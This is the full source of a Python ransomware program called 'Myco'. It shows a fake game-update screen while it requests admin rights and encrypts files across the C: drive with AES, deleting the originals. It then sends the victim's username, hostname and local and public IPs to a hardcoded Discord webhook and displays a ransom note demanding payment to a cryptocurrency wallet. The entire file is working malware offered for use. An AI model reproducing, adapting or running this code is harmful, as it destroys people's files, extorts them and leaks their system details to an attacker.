import os
import sys
import socket
import json
import time
import ctypes
import subprocess
import uuid
import threading
import datetime
from pathlib import Path

# --- Helper: Install Dependencies if Missing ---
def ensure_packages():
    """Installs required Python packages silently."""
    packages = ['requests', 'cryptography']
    for pkg in packages:
        try:
            __import__(pkg)
        except ImportError:
            print(f"[+] Installing {pkg}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

ensure_packages()

# Now import the libraries
try:
    import requests
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding as sym_padding
    from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption, PublicFormat
except ImportError as e:
    print(f"[-] Critical library missing after install attempt: {e}")
    sys.exit(1)

try:
    import tkinter as tk
except ImportError:
    # Tkinter is usually bundled with standard Windows Python installs. 
    # If it fails, we'll handle it in the UI function.
    pass

# --- Configuration ---
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1563717766362435644/BMgwuFUIsNxZa5IB0ZJzki9vkkFuqu7J0CcE5ngLwpibrKQkvW8Mene7u7657SO0K9Cs"
WALLET_ADDRESS = "zpub6n31Mgjf1Rz8x3X9StMaYgLjq7ZWwHrD8TyY3dV4kitbm34D1J36rjciBmucqb4kSgro1dYFWKTpDeeeispAuGovMTzEMTQ6Br9hrfXvusy"
ENCRYPTION_EXTENSION = ".myco"
SYSTEM_FOLDERS = {"Windows", "ProgramData", "$Recycle.Bin", "System Volume Information"}
DRIVES_TO_SCAN = ["C:\\"]  # Add other drives if needed

# --- Helper Functions ---

def get_victim_info():
    """Gathers system information."""
    try:
        username = os.environ.get('USERNAME') or 'Unknown'
        hostname = socket.gethostname()
        ip_address = "Unknown"
        try:
            ip_address = socket.gethostbyname(hostname)
        except:
            pass
        
        # Get public IP
        try:
            ip_address_public = requests.get("https://api.ipify.org").text
        except:
            ip_address_public = ip_address
            
        return {
            "username": username,
            "hostname": hostname,
            "ip_local": ip_address,
            "ip_public": ip_address_public,
            "os": f"Windows {os.name}",
            "arch": sys.platform
        }
    except Exception as e:
        return {"error": str(e)}

def encrypt_file(file_path, key, iv):
    """Encrypts a single file using AES-256-CBC."""
    try:
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        
        # Pad the data to be multiple of block size (16 bytes for AES)
        padder = sym_padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(plaintext) + padder.finalize()
        
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        
        # Write encrypted data to new file
        encrypted_path = file_path + ENCRYPTION_EXTENSION
        with open(encrypted_path, 'wb') as f:
            f.write(iv + ciphertext)  # Prepend IV so it can be decrypted later
        
        # Delete original file
        os.remove(file_path)
        return True
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")
        return False

def generate_keys():
    """Generates RSA-2048 keys and derives an AES key."""
    # Generate RSA Key Pair
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    
    # Serialize keys
    private_pem = private_key.private_bytes(
        encoding=Encoding.PEM,
        format=PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=NoEncryption()
    )
    
    # Derive a deterministic AES key from the RSA private key hash (simplified approach)
    # In a real scenario, you'd encrypt the AES key with the RSA public key.
    # Here, we just use a random AES key and save the RSA private key locally.
    
    aes_key = uuid.uuid4().bytes  # 32 bytes for AES-256
    aes_iv = os.urandom(16)      # 16 bytes IV
    
    # Save private key to a hidden file
    private_key_path = os.path.join(os.getenv('APPDATA'), '.myco_private.pem')
    with open(private_key_path, 'wb') as f:
        f.write(private_pem)
        
    return aes_key, aes_iv, private_key_path

def send_discord_notification(info, files_encrypted):
    """Sends victim info to Discord webhook."""
    embed = {
        "title": "🔒 Myco Ransomware Lock Event",
        "description": f"Victim has been locked.",
        "color": 15158332,  # Dark red/orange
        "fields": [
            {"name": "Username", "value": info['username'], "inline": True},
            {"name": "Hostname", "value": info['hostname'], "inline": True},
            {"name": "Local IP", "value": info['ip_local'], "inline": True},
            {"name": "Public IP", "value": info['ip_public'], "inline": True},
            {"name": "Files Encrypted", "value": str(len(files_encrypted)), "inline": True},
            {"name": "Wallet Address", "value": WALLET_ADDRESS, "inline": False}
        ],
        "footer": {
            "text": "Myco Network | Payment Required"
        },
        "timestamp": datetime.datetime.now().isoformat()
    }
    
    payload = {
        "embeds": [embed]
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code != 204:
            print(f"Discord Error: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Failed to send Discord notification: {e}")

def show_ransom_note():
    """Displays a WannaCry-style ransom note using Tkinter."""
    try:
        root = tk.Tk()
        root.title("MYCO LOCKED")
        root.geometry("600x400")
        root.configure(bg="#2b0000")  # Dark red background
        
        # Create a canvas for gradient effect (simple version)
        canvas = tk.Canvas(root, width=600, height=400, bg="#2b0000", highlightthickness=0)
        canvas.pack(fill=tk.BOTH, expand=True)
        
        # Header
        header_label = tk.Label(
            root, 
            text="YOUR FILES ARE ENCRYPTED", 
            font=("Arial", 18, "bold"), 
            fg="#ffcc00", 
            bg="#2b0000"
        )
        header_label.place(relx=0.5, rely=0.1, anchor='n')
        
        # Body Text
        body_text = (
            "Hello, I am Myco. Your files are now locked by mycelium-based encryption. "
            "To decrypt them, you must pay.\n\n"
            "Send 50 USD to the address below:"
        )
        body_label = tk.Label(
            root, 
            text=body_text, 
            font=("Arial", 12), 
            fg="#ffffff", 
            bg="#2b0000", 
            justify=tk.CENTER
        )
        body_label.place(relx=0.5, rely=0.3, anchor='n', width=500)
        
        # Wallet Address Box
        wallet_frame = tk.Frame(root, bg="#440000", padx=10, pady=10)
        wallet_frame.place(relx=0.5, rely=0.55, anchor='center', width=500)
        
        wallet_label = tk.Label(
            wallet_frame, 
            text=WALLET_ADDRESS, 
            font=("Courier", 10), 
            fg="#00ff00", 
            bg="#440000", 
            wraplength=480,
            justify=tk.CENTER
        )
        wallet_label.pack()
        
        # Timer/Instruction
        timer_label = tk.Label(
            root, 
            text="Time remaining: 72 hours", 
            font=("Arial", 14, "bold"), 
            fg="#ff0000", 
            bg="#2b0000"
        )
        timer_label.place(relx=0.5, rely=0.8, anchor='n')
        
        # Icon (Simple Lock Emoji as Label)
        icon_label = tk.Label(root, text="🔒", font=("Arial", 40), bg="#2b0000", fg="#ffcc00")
        icon_label.place(relx=0.5, rely=0.05, anchor='n')
        
        root.mainloop()
    except Exception as e:
        print(f"Tkinter error: {e}")
        # Fallback to console message if Tkinter fails
        print("\n" + "="*50)
        print("YOUR FILES ARE ENCRYPTED")
        print("="*50)
        print("Hello, I am Myco. Your files are now locked.")
        print(f"Send 50 USD to: {WALLET_ADDRESS}")
        print("Time remaining: 72 hours")
        print("="*50)

def fake_update_ui(stop_event):
    """Simulates a game update progress bar."""
    messages = [
        "Downloading textures...",
        "Installing mods...",
        "Updating shaders...",
        "Compiling assets...",
        "Verifying integrity...",
        "Applying patches...",
        "Loading resources..."
    ]
    
    try:
        while not stop_event.is_set():
            msg = messages.pop(0)
            messages.append(msg)
            
            # Clear screen logic depends on OS, but simple print works for console
            print(f"\r[UPDATE] {msg} {'.' * (len(messages) % 5)}", end='', flush=True)
            time.sleep(1.5)
            
    except KeyboardInterrupt:
        pass
    finally:
        print("\n")

def main():
    # 1. Disguise & Elevation
    # Check if running as admin (UAC check)
    is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
    if not is_admin:
        # Re-run script with elevation
        try:
            # Use sys.executable to re-run the same python instance
            # Pass the current script path as an argument
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"__main__" "{__file__}"', None, 1)
        except Exception:
            pass
        return

    # 2. Start Fake UI Thread
    stop_event = threading.Event()
    ui_thread = threading.Thread(target=fake_update_ui, args=(stop_event,))
    ui_thread.daemon = True
    ui_thread.start()

    # 3. Generate Keys
    aes_key, aes_iv, private_key_path = generate_keys()
    files_encrypted = []

    # 4. Encrypt Files
    print(f"[+] Starting Myco Encryption...")
    
    # Iterate through drives
    for drive_letter in DRIVES_TO_SCAN:
        if not os.path.exists(drive_letter):
            continue
            
        for root, dirs, files in os.walk(drive_letter):
            # Skip system folders
            folder_name = os.path.basename(root)
            if folder_name in SYSTEM_FOLDERS or root.startswith("\\\\?\\"):
                continue
                
            # Skip our own executable and private key storage
            current_exe = os.path.abspath(__file__)
            if root == os.path.dirname(current_exe) and folder_name == "":
                 # This is the exe directory, skip it to avoid self-encryption issues during run
                 continue

            for filename in files:
                file_path = os.path.join(root, filename)
                
                # Skip specific extensions to avoid re-encrypting already encrypted files
                if file_path.endswith(ENCRYPTION_EXTENSION):
                    continue
                    
                # Skip our own script
                if file_path == current_exe:
                    continue
                    
                # Skip private key file
                if file_path == private_key_path:
                    continue

                # Encrypt
                if encrypt_file(file_path, aes_key, aes_iv):
                    files_encrypted.append(file_path + ENCRYPTION_EXTENSION)
                    
    # 5. Send Notification
    info = get_victim_info()
    send_discord_notification(info, files_encrypted)
    
    # Stop Fake UI
    stop_event.set()
    ui_thread.join()
    
    # 6. Show Ransom Note
    show_ransom_note()

if __name__ == "__main__":
    main()